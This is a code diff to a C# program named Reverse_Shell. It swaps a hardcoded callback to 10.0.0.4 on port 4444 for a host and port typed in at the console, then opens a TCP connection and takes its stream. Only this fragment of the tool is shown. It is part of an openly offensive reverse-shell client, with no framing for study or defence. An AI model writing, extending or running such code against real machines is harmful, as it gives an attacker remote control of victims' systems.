@@ -19,7 +19,12 @@ namespace Reverse_Shell
 
         static void Main(string[] args)
         {
-            using (TcpClient client = new TcpClient("10.0.0.4", 4444))
+            Console.WriteLine("Connect to:");
+            string dest = Console.ReadLine();
+            Console.WriteLine("Port:");
+            string port = Console.ReadLine();
+
+            using (TcpClient client = new TcpClient(dest, Int32.Parse(port)))
             {
                 using (Stream stream = client.GetStream())
                 {
